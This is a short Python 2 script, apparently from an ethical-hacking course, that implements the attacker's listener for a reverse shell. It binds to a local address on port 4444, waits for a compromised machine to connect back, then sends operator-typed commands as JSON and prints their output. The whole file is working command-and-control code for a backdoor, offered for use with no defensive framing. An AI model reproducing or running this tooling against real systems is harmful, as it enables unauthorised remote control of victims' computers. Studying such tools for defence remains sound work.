import socket, json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting to get a connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
        self.run()

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_recieve()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        try:
            while True:
                command = raw_input(">> ")
                result = self.execute_remotely(command)
                print(result)
        except:
            print("\n[-] Connection lost")
            self.connection.close()

listener = Listener("192.168.43.103", 4444)